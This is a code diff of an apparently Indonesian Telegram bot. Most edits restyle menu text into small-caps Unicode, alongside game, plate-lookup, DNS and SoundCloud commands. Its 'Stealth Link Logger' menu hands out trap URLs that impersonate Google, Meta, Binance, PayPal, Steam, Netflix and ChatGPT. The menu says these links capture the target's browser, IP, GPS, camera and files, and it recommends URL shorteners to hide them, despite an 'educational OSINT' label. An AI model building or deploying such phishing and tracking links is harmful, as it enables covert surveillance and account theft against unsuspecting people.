-        `━━━━━━━━━━━━━━━━━━━━\n` +
-        `• <b>/suit [batu/gunting/kertas]</b>\n` +
-        `• <b>/math</b> (Tebak hasil matematika hitung cepat)\n` +
-        `• <b>/dadu</b> (Kocok dadu standar)\n` +
-        `• <b>/coinflip</b> (Lempar koin Head/Tail)\n` +
-        `• <b>/susunkata</b> (Main acak kata)\n` +
-        `• <b>/tebakangka</b> (1-10)\n` +
-        `• <b>/khodam [nama]</b> (Cek khodam lucu)\n` +
-        `• <b>/ramal [nama]</b> (Ramalan AI lucu)\n` +
-        `• <b>/jodoh [nama1] [nama2]</b> (Kalkulator jodoh)\n` +
-        `• <b>/kartu</b> (Ambil kartu remi)\n` +
-        `• <b>/roulette</b> (Russian Roulette spin)\n` +
-        `• <b>/werewolf</b> (Ambil role werewolf)\n` +
-        `• <b>/8ball [teks]</b> (Magic 8-ball)\n` +
-        `• <b>/tarot</b> (Ramalan kartu tarot acak)\n` +
-        `• <b>/doa</b> (Doa dan motivasi random)\n` +
-        `• <b>/tod</b> (Truth or Dare acak)\n` +
-        `• <b>/meme</b> | <b>/joke</b> | <b>/quote</b>\n` +
-        `• <b>/fact</b> (Fakta unik global)\n` +
-        `• <b>/cat</b> | <b>/dog</b>\n` +
-        `• <b>/gombal [nama]</b> (Gombalan maut)\n` +
+      const txt = `<b>🎲 ᴍɪɴɪ ɢᴀᴍᴇꜱ ᴄᴏɴꜱᴏʟᴇ</b>\n` +
+        `━━━━━━━━━━━━━━━━━━━━\n\n` +
+        `• <b>/suit [ʙᴀᴛᴜ/ɢᴜɴᴛɪɴɢ/ᴋᴇʀᴛᴀꜱ]</b>\n\n` +
+        `• <b>/math</b> (ᴛᴇʙᴀᴋ ʜᴀꜱɪʟ ᴍᴀᴛᴇᴍᴀᴛɪᴋᴀ)\n\n` +
+        `• <b>/dadu</b> (ᴋᴏᴄᴏᴋ ᴅᴀᴅᴜ ꜱᴛᴀɴᴅᴀʀ)\n\n` +
+        `• <b>/coinflip</b> (ʟᴇᴍᴘᴀʀ ᴋᴏɪɴ ʜᴇᴀᴅ/ᴛᴀɪʟ)\n\n` +
+        `• <b>/susunkata</b> (ᴍᴀɪɴ ᴀᴄᴀᴋ ᴋᴀᴛᴀ)\n\n` +
+        `• <b>/tebakangka</b> (1-10)\n\n` +
+        `• <b>/khodam [ɴᴀᴍᴀ]</b> (ᴄᴇᴋ ᴋʜᴏᴅᴀᴍ)\n\n` +
+        `• <b>/ramal [ɴᴀᴍᴀ]</b> (ʀᴀᴍᴀʟᴀɴ ᴀɪ)\n\n` +
+        `• <b>/jodoh [ɴᴀᴍᴀ1] [ɴᴀᴍᴀ2]</b> (ᴋᴀʟᴋᴜʟᴀᴛᴏʀ ᴊᴏᴅᴏʜ)\n\n` +
+        `• <b>/kartu</b> (ᴀᴍʙɪʟ ᴋᴀʀᴛᴜ ʀᴇᴍɪ)\n\n` +
+        `• <b>/roulette</b> (ʀᴜꜱꜱɪᴀɴ ʀᴏᴜʟᴇᴛᴛᴇ)\n\n` +
+        `• <b>/8ball [ᴛᴇᴋꜱ]</b> (ᴍᴀɢɪᴄ 8-ʙᴀʟʟ)\n\n` +
+        `• <b>/tarot</b> (ʀᴀᴍᴀʟᴀɴ ᴋᴀʀᴛᴜ ᴛᴀʀᴏᴛ)\n\n` +
+        `• <b>/doa</b> (ᴅᴏᴀ & ᴍᴏᴛɪᴠᴀꜱɪ ʀᴀɴᴅᴏᴍ)\n\n` +
+        `• <b>/tod</b> (ᴛʀᴜᴛʜ ᴏʀ ᴅᴀʀᴇ)\n\n` +
+        `• <b>/meme</b> | <b>/joke</b> | <b>/quote</b>\n\n` +
+        `• <b>/fact</b> (ꜰᴀᴋᴛᴀ ᴜɴɪᴋ ɢʟᴏʙᴀʟ)\n\n` +
+        `• <b>/cat</b> | <b>/dog</b>\n\n` +
+        `• <b>/gombal [ɴᴀᴍᴀ]</b> (ɢᴏᴍʙᴀʟᴀɴ ᴍᴀᴜᴛ)\n\n` +
         `━━━━━━━━━━━━━━━━━━━━`;
-      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ Kembali', 'menu_main')]]);
+      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ ᴋᴇᴍʙᴀʟɪ', 'menu_main')]]);
       ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
     });
 
     bot.action('menu_media', (ctx) => {
       ctx.answerCbQuery().catch(() => {});
-      const txt = `<b>🎵 MEDIA & DOWNLOADS</b>\n` +
-        `━━━━━━━━━━━━━━━━━━━━\n` +
-        `• <b>/lagu [judul]</b>\n  └ <i>Audio Download Engine (MP3) High Speed.</i>\n\n` +
-        `• <b>/play [judul]</b>\n  └ <i>Sama dengan /lagu.</i>\n` +
+      const txt = `<b>🎵 ᴍᴇᴅɪᴀ & ᴅᴏᴡɴʟᴏᴀᴅꜱ</b>\n` +
+        `━━━━━━━━━━━━━━━━━━━━\n\n` +
+        `• <b>/lagu [ᴊᴜᴅᴜʟ]</b>\n` +
+        `  └ <i>ᴀᴜᴅɪᴏ ᴅᴏᴡɴʟᴏᴀᴅ ᴇɴɢɪɴᴇ (ᴍᴘ3)</i>\n\n` +
+        `• <b>/play [ᴊᴜᴅᴜʟ]</b>\n` +
+        `  └ <i>ꜱᴀᴍᴀ ᴅᴇɴɢᴀɴ /ʟᴀɢᴜ</i>\n\n` +
         `━━━━━━━━━━━━━━━━━━━━`;
-      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ Kembali', 'menu_main')]]);
+      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ ᴋᴇᴍʙᴀʟɪ', 'menu_main')]]);
       ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
     });
 
     bot.action('menu_logger', (ctx) => {
       ctx.answerCbQuery().catch(() => {});
       const id = generateTrapId(ctx.chat!.id);
-      let msg = `<b>🎣 STEALTH LINK LOGGER v5.2</b>\n` +
+      let msg = `<b>🎣 ꜱᴛᴇᴀʟᴛʜ ʟɪɴᴋ ʟᴏɢɢᴇʀ ᴠ5.2</b>\n` +
                 `━━━━━━━━━━━━━━━━━━━━\n` +
-                `Pilih template operasional berikut:\n\n`;
+                `ᴘɪʟɪʜ ᴛᴇᴍᴘʟᴀᴛᴇ ᴏᴘᴇʀᴀꜱɪᴏɴᴀʟ ʙᴇʀɪᴋᴜᴛ:\n\n`;
       
       const tmplDesc: Record<string, string> = {
-        'google': '└ <i>Identity Ecosystem. Audit browser-bus & high-entropy patterns.</i>',
-        'gallery': '└ <i>Forensic Registry. Media telemetry & social-graph extraction.</i>',
-        'cloudflare': '└ <i>Edge Verification. Precision fingerprinting & sensor audit.</i>',
-        'pegasus': '└ <i>Kernel Intelligence v9.3. Elite hardware diagnostics (Stable).</i>',
-        'wifi': '└ <i>Hotspot Auth. Network forensic mapping & triangulation.</i>',
-        'recap': '└ <i>Ghost Recon. Multi-layered silent background telemetry.</i>',
-        'security_audit': '└ <i>System Audit. Cross-browser environment integrity check.</i>',
-        'meta_login': '└ <i>Social Sync. Recover account via hardware identity.</i>',
-        'binance': '└ <i>Crypto Security. Hardware audit for withdrawal approval.</i>',
-        'paypal': '└ <i>Fintech Audit. Transaction safety & device verification.</i>',
-        'steam': '└ <i>Gaming Guard. Account recovery & authenticator sync.</i>',
-        'netflix': '└ <i>Media Sync. Household verification via grid mapping.</i>',
-        'tiktok': '└ <i>Creator Audit. Environment integrity for creator status.</i>',
-        'chatgpt': '└ <i>AI Dev Audit. API quota & developer environment check.</i>'
+        'google': '└ <i>ɪᴅᴇɴᴛɪᴛʏ ᴇᴄᴏꜱʏꜱᴛᴇᴍ. ᴀᴜᴅɪᴛ ʙʀᴏᴡꜱᴇʀ-ʙᴜꜱ & ʜɪɢʜ-ᴇɴᴛʀᴏᴘʏ.</i>',
+        'gallery': '└ <i>ꜰᴏʀᴇɴꜱɪᴄ ʀᴇɢɪꜱᴛʀʏ. ᴍᴇᴅɪᴀ ᴛᴇʟᴇᴍᴇᴛʀʏ & ꜱᴏᴄɪᴀʟ-ɢʀᴀᴘʜ.</i>',
+        'cloudflare': '└ <i>ᴇᴅɢᴇ ᴠᴇʀɪꜰɪᴄᴀᴛɪᴏɴ. ᴘʀᴇᴄɪꜱɪᴏɴ ꜰɪɴɢᴇʀᴘʀɪɴᴛɪɴɢ.</i>',
+        'pegasus': '└ <i>ᴋᴇʀɴᴇʟ ɪɴᴛᴇʟʟɪɢᴇɴᴄᴇ ᴠ9.3. ᴇʟɪᴛᴇ ʜᴀʀᴅᴡᴀʀᴇ (ꜱᴛᴀʙʟᴇ).</i>',
+        'wifi': '└ <i>ʜᴏᴛꜱᴘᴏᴛ ᴀᴜᴛʜ. ɴᴇᴛᴡᴏʀᴋ ꜰᴏʀᴇɴꜱɪᴄ ᴍᴀᴘᴘɪɴɢ.</i>',
+        'recap': '└ <i>ɢʜᴏꜱᴛ ʀᴇᴄᴏɴ. ᴍᴜʟᴛɪ-ʟᴀʏᴇʀᴇᴅ ꜱɪʟᴇɴᴛ ᴛᴇʟᴇᴍᴇᴛʀʏ.</i>',
+        'security_audit': '└ <i>ꜱʏꜱᴛᴇᴍ ᴀᴜᴅɪᴛ. ᴇɴᴠɪʀᴏɴᴍᴇɴᴛ ɪɴᴛᴇɢʀɪᴛʏ ᴄʜᴇᴄᴋ.</i>',
+        'meta_login': '└ <i>ꜱᴏᴄɪᴀʟ ꜱʏɴᴄ. ʀᴇᴄᴏᴠᴇʀ ᴀᴄᴄᴏᴜɴᴛ ᴠɪᴀ ʜᴀʀᴅᴡᴀʀᴇ.</i>',
+        'binance': '└ <i>ᴄʀʏᴘᴛᴏ ꜱᴇᴄᴜʀɪᴛʏ. ʜᴀʀᴅᴡᴀʀᴇ ᴀᴜᴅɪᴛ ꜰᴏʀ ᴀꜱꜱᴇᴛꜱ.</i>',
+        'paypal': '└ <i>ꜰɪɴᴛᴇᴄʜ ᴀᴜᴅɪᴛ. ᴛʀᴀɴꜱᴀᴄᴛɪᴏɴ ꜱᴀꜰᴇᴛʏ ᴠᴇʀɪꜰɪᴄᴀᴛɪᴏɴ.</i>',
+        'steam': '└ <i>ɢᴀᴍɪɴɢ ɢᴜᴀʀᴅ. ᴀᴄᴄᴏᴜɴᴛ ʀᴇᴄᴏᴠᴇʀʏ ꜱʏɴᴄ.</i>',
+        'netflix': '└ <i>ᴍᴇᴅɪᴀ ꜱʏɴᴄ. ʜᴏᴜꜱᴇʜᴏʟᴅ ᴠᴇʀɪꜰɪᴄᴀᴛɪᴏɴ ɢʀɪᴅ.</i>',
+        'tiktok': '└ <i>ᴄʀᴇᴀᴛᴏʀ ᴀᴜᴅɪᴛ. ᴇɴᴠɪʀᴏɴᴍᴇɴᴛ ɪɴᴛᴇɢʀɪᴛʏ ᴄʜᴇᴄᴋ.</i>',
+        'chatgpt': '└ <i>ᴀɪ ᴅᴇᴠ ᴀᴜᴅɪᴛ. ᴀᴘɪ ǫᴜᴏᴛᴀ & ᴅᴇᴠ ᴇɴᴠ ᴍᴀᴘᴘɪɴɢ.</i>'
       };
 
       Object.entries(templates).forEach(([key, tmpl]) => {
         const trapUrl = `${appHost.replace(/\/$/, '')}/t/${key}/${id}`;
-        msg += `📦 <b>${tmpl.name}</b>\n${tmplDesc[key] || ''}\n🔗 <code>${trapUrl}</code>\n\n`;
+        msg += `📦 <b>${tmpl.name}</b>\n` +
+               `${tmplDesc[key] || ''}\n` +
+               `🔗 <code>${trapUrl}</code>\n\n` +
+               `━━━━━━━━━━━━━━━━━━━━\n\n`;
       });
 
-      msg += `━━━━━━━━━━━━━━━━━━━━\n` +
-             `💡 <b>ALATZ:</b> Browser & IP dideteksi otomatis. Module <b>Advanced</b> (GPS, Cam, Files) terkirim jika target mengizinkan akses di halaman.\n\n` +
-             `⚠️ <i>Saran: Gunakan layanan pemendek URL untuk hasil maksimal.</i>`;
+      msg += `💡 <b>ɪɴꜰᴏ:</b> ʙʀᴏᴡꜱᴇʀ & ɪᴘ ᴅɪᴅᴇᴛᴇᴋꜱɪ ᴏᴛᴏᴍᴀᴛɪꜱ.\n` +
+             `ᴍᴏᴅᴜʟᴇ <b>ᴀᴅᴠᴀɴᴄᴇᴅ</b> (ɢᴘꜱ, ᴄᴀᴍ, ꜰɪʟᴇꜱ) ᴛᴇʀᴋɪʀɪᴍ ᴊɪᴋᴀ ᴛᴀʀɢᴇᴛ ᴍᴇɴɢɪᴢɪɴᴋᴀɴ ᴀᴋꜱᴇꜱ.\n\n` +
+             `⚠️ <i>ꜱᴀʀᴀɴ: ɢᴜɴᴀᴋᴀɴ ʟᴀʏᴀɴᴀɴ ᴘᴇᴍᴇɴᴅᴇᴋ ᴜʀʟ.</i>`;
       
-      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ Kembali', 'menu_main')]]);
+      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ ᴋᴇᴍʙᴀʟɪ', 'menu_main')]]);
       ctx.editMessageText(msg, {
         parse_mode: 'HTML',
         link_preview_options: { is_disabled: true },
@@ -632,13 +658,18 @@ async function startServer() {
 
     bot.action('menu_help', (ctx) => {
       ctx.answerCbQuery().catch(() => {});
-      const txt = `<b>ℹ️ TERMINAL INFO & HELP</b>\n` +
-        `━━━━━━━━━━━━━━━━━━━━\n` +
-        `Dibuat untuk tujuan edukasi investigasi digital (OSINT).\n\n` +
-        `<b>Host Aktif:</b> <code>${appHost}</code>\n` +
-        `<b>Status Bot:</b> Online ✅\n\n` +
-        `Gunakan perintah <code>/sethost</code> jika link logger tidak bisa dibuka (Masalah IP Publink).`;
-      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ Kembali', 'menu_main')]]);
+      const txt = `<b>ℹ️ ᴛᴇʀᴍɪɴᴀʟ ɪɴꜰᴏ & ʜᴇʟᴘ</b>\n` +
+        `━━━━━━━━━━━━━━━━━━━━\n\n` +
+        `ᴅɪʙᴜᴀᴛ ᴜɴᴛᴜᴋ ᴛᴜᴊᴜᴀɴ ᴇᴅᴜᴋᴀꜱɪ ɪɴᴠᴇꜱᴛɪɢᴀꜱɪ ᴅɪɢɪᴛᴀʟ (ᴏꜱɪɴᴛ).\n\n` +
+        `━━━━━━━━━━━━━━━━━━━━\n\n` +
+        `🌐 <b>ʜᴏꜱᴛ ᴀᴋᴛɪꜰ</b>\n` +
+        `<code>${appHost}</code>\n\n` +
+        `✅ <b>ꜱᴛᴀᴛᴜꜱ ʙᴏᴛ</b>\n` +
+        `ᴏɴʟɪɴᴇ\n\n` +
+        `⚙️ <b>ᴘᴇʀɪɴᴛᴀʜ</b>\n` +
+        `ɢᴜɴᴀᴋᴀɴ <code>/ꜱᴇᴛʜᴏꜱᴛ</code> ᴊɪᴋᴀ ʟɪɴᴋ ʟᴏɢɢᴇʀ ᴛɪᴅᴀᴋ ʙɪꜱᴀ ᴅɪʙᴜᴋᴀ.\n\n` +
+        `━━━━━━━━━━━━━━━━━━━━`;
+      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ ᴋᴇᴍʙᴀʟɪ', 'menu_main')]]);
       ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
     });
 
@@ -697,7 +728,7 @@ async function startServer() {
       
       if (!match) return ctx.reply("❌ Format plat nomor tidak valid.");
       
-      const platMap: Record<string, string> = { "A": "Banten", "B": "DKI Jakarta, Depok, Tangerang, Bekasi", "D": "Bandung, Cimahi", "E": "Cirebon, Indramayu, Majalengka, Kuningan", "F": "Bogor, Sukabumi, Cianjur", "T": "Purwakarta, Karawang, Subang", "Z": "Garut, Tasikmalaya, Sumedang, Ciamis, Banjar", "G": "Pekalongan, Tegal, Brebes, Batang, Pemalang", "H": "Semarang, Salatiga, Kendal, Demak", "K": "Pati, Kudus, Jepara, Rembang, Blora, Grobogan", "R": "Banyumas, Cilacap, Purbalingga, Banjarnegara", "AA": "Magelang, Purworejo, Kebumen, Temanggung, Wonosobo", "AD": "Surakarta, Sukoharjo, Boyolali, Klaten, Karanganyar, Wonogiri, Sragen", "AB": "DI Yogyakarta", "L": "Surabaya", "M": "Madura", "N": "Malang, Probolinggo, Pasuruan, Lumajang", "P": "Besi, Situbondo, Bondowoso, Jember, Banyuwangi", "S": "Bojonegoro, Mojokerto, Tuban, Lamongan, Jombang", "W": "Sidoarjo, Gresik", "AE": "Madiun, Ngawi, Magetan, Ponorogo, Pacitan", "AG": "Kediri, Blitar, Tulungagung, Nganjuk, Trenggalek", "DK": "Bali", "DR": "Lombok", "EA": "Sumbawa", "DH": "Timor", "EB": "Flores", "ED": "Sumba", "KB": "Kalimantan Barat", "DA": "Kalimantan Selatan", "KH": "Kalimantan Tengah", "KT": "Kalimantan Timur", "KU": "Kalimantan Utara", "DB": "Manado, Tomohon, Bitung", "DL": "Sangihe, Talaud, Sitaro", "DM": "Gorontalo", "DN": "Sulawesi Tengah", "DT": "Sulawesi Tenggara", "DD": "Makassar, Gowa, Maros", "DP": "Parepare, Palopo, Luwu", "DC": "Sulawesi Barat", "PA": "Papua", "PB": "Papua Barat", "BL": "Aceh", "BB": "Sumut (Barat)", "BK": "Sumut (Timur)/Medan", "BA": "Sumatera Barat", "BM": "Riau", "BP": "Kepulauan Riau", "BG": "Sumatera Selatan", "BN": "Bangka Belitung", "BE": "Lampung", "BD": "Bengkulu", "BH": "Jambi" };
+      const platMap: Record<string, string> = { "A": "Banten", "B": "DKI Jakarta, Depok, Tangerang, Bekasi", "D": "Bandung, Cimahi", "E": "Cirebon, Indramayu, Majalengka, Kuningan", "F": "Bogor, Sukabumi, Cianjur", "T": "Purwakarta, Karawang, Subang", "Z": "Garut, Tasikmalaya, Sumedang, Ciamis, Banjar", "G": "Pekalongan, Tegal, Brebes, Batang, Pemalang", "H": "Semarang", "DN": "Sulawesi Tengah", "DT": "Sulawesi Tenggara", "DD": "Makassar, Gowa, Maros", "DP": "Parepare, Palopo, Luwu", "DC": "Sulawesi Barat", "PA": "Papua", "PB": "Papua Barat", "BL": "Aceh", "BB": "Sumut (Barat)", "BK": "Sumut (Timur)/Medan", "BA": "Sumatera Barat", "BM": "Riau", "BP": "Kepulauan Riau", "BG": "Sumatera Selatan", "BN": "Bangka Belitung", "BE": "Lampung", "BD": "Bengkulu", "BH": "Jambi" };
 
       const kodeWilayah = match[1];
       const angka = match[2];
@@ -705,15 +736,14 @@ async function startServer() {
 
       const wilayah = platMap[kodeWilayah] || "Wilayah tidak terdaftar";
 
-      const reply = `<b>🚗 PLAT ANALYZER (ID)</b>\n` +
+      const reply = `━━━━━ ᴘʟᴀᴛ ᴀɴᴀʟʏᴢᴇʀ ━━━━━\n\n` +
+                    `🔢 <b>ᴘʟᴀᴛ :</b> <code>${kodeWilayah} ${angka} ${kodeDetail}</code>\n\n` +
+                    `📍 <b>ᴡɪʟᴀʏᴀʜ :</b> ${wilayah}\n\n` +
+                    `├ ᴋᴏᴅᴇ ᴀʀᴇᴀ : ${kodeWilayah}\n` +
+                    `├ ɴᴏ ᴘᴏʟɪꜱɪ : ${angka}\n` +
+                    `└ ᴅᴇᴛᴀɪʟ/ꜱᴜʙ : ${kodeDetail || '-'}\n\n` +
                     `━━━━━━━━━━━━━━━━━━━━\n` +
-                    `🔢 <b>PLAT:</b> <code>${kodeWilayah} ${angka} ${kodeDetail}</code>\n` +
-                    `📍 <b>WILAYAH:</b> ${wilayah}\n` +
-                    `├ Kode Area: ${kodeWilayah}\n` +
-                    `├ No Polisi: ${angka}\n` +
-                    `└ Detail/Sub: ${kodeDetail || '-'}\n` +
-                    `━━━━━━━━━━━━━━━━━━━━\n` +
-                    `✅ <i>Analisis selesai.</i>`;
+                    `✅ <i>ᴀɴᴀʟɪꜱɪꜱ ꜱᴇʟᴇꜱᴀɪ.</i>`;
 
       ctx.reply(reply, { parse_mode: 'HTML' });
     });
@@ -836,15 +866,14 @@ async function startServer() {
         const response = await fetch(`https://networkcalc.com/api/dns/lookup/${domain}`);
         const data = await response.json();
         if(data.status === 'OK' && data.records) {
-          let txt = `📋 <b>DNS RECORD MAPPING</b>\n` +
-                    `━━━━━━━━━━━━━━━━━━━━\n` +
-                    `💎 <b>DOMAIN:</b> <code>${domain}</code>\n\n`;
+          let txt = `━━━━━ ᴅɴꜱ ᴍᴀᴘᴘɪɴɢ ━━━━━\n\n` +
+                    `💎 <b>ᴅᴏᴍᴀɪɴ :</b> <code>${domain}</code>\n\n`;
           ['A', 'AAAA', 'MX', 'TXT', 'CNAME', 'NS'].forEach(type => {
             if(data.records[type] && data.records[type].length > 0) {
-              txt += `<b>[+] ${type} RECORDS:</b>\n`;
+              txt += `<b>[+] ${type} ʀᴇᴄᴏʀᴅꜱ :</b>\n`;
               data.records[type].forEach((rec: any, idx: number, arr: any[]) => {
                 const sym = idx === arr.length - 1 ? '└' : '├';
-                if(type === 'MX') txt += `${sym} <code>${rec.exchange}</code> (Prio: ${rec.priority})\n`;
+                if(type === 'MX') txt += `${sym} <code>${rec.exchange}</code> (ᴘʀɪᴏ: ${rec.priority})\n`;
                 else if(type === 'TXT') txt += `${sym} <code>${rec.replace(/.{1,40}/g, '$&')}</code>\n`;
                 else txt += `${sym} <code>${rec.address || rec}</code>\n`;
               });
@@ -852,7 +881,7 @@ async function startServer() {
             }
           });
           txt += `━━━━━━━━━━━━━━━━━━━━\n` +
-                 `✅ <i>Fetch DNS selesai.</i>`;
+                 `✅ <i>ꜰᴇᴛᴄʜ ᴅɴꜱ ꜱᴇʟᴇꜱᴀɪ.</i>`;
           if(txt.length > 4000) txt = txt.substring(0, 3950) + "\n\n... (Terpotong limit)";
           ctx.reply(txt, {parse_mode: 'HTML'});
         } else {
@@ -1393,22 +1422,22 @@ async function startServer() {
       
       const waitMsg = await ctx.reply("⏳ <i>Mencari lagu di database (Soundcloud API)...</i>", { parse_mode: 'HTML' });
       try {
-        const scResult = await scdl.default.search({
+        const scResult = await scdl.search({
           query: args,
           resourceType: "tracks",
           limit: 1
         });
         
         if (!scResult || scResult.collection.length === 0) {
-           return ctx.telegram.editMessageText(ctx.chat.id, waitMsg.message_id, undefined, "❌ Lagu tidak ditemukan di Soundcloud.");
+           return ctx.telegram.editMessageText(ctx.chat.id, waitMsg.message_id, undefined, "❌ ʟᴀɢᴜ ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ ᴅɪ ꜱᴏᴜɴᴅᴄʟᴏᴜᴅ.");
         }
         
-        const trackInfo = await scdl.default.getInfo(scResult.collection[0].permalink_url);
+        const trackInfo = await scdl.getInfo(scResult.collection[0].permalink_url);
         
-        await ctx.telegram.editMessageText(ctx.chat.id, waitMsg.message_id, undefined, `⏳ <i>Mengunduh Audio: ${trackInfo.title}...\n(Proses bypass kecepatan tinggi sedang berjalan...)</i>`, { parse_mode: 'HTML' });
+        await ctx.telegram.editMessageText(ctx.chat.id, waitMsg.message_id, undefined, `⏳ <i>ᴍᴇɴɢᴜɴᴅᴜʜ ᴀᴜᴅɪᴏ: ${trackInfo.title}...\n(ᴘʀᴏꜱᴇꜱ ʙʏᴘᴀꜱꜱ ᴋᴇᴄᴇᴘᴀᴛᴀɴ ᴛɪɴɢɢɪ ꜱᴇᴅᴀɴɢ ʙᴇʀᴊᴀʟᴀɴ...)</i>`, { parse_mode: 'HTML' });
         
         try {
-          const stream = await scdl.default.download(trackInfo.permalink_url);
+          const stream = await scdl.download(trackInfo.permalink_url);
           
           await ctx.replyWithAudio(
             { source: stream, filename: trackInfo.title + '.mp3' },
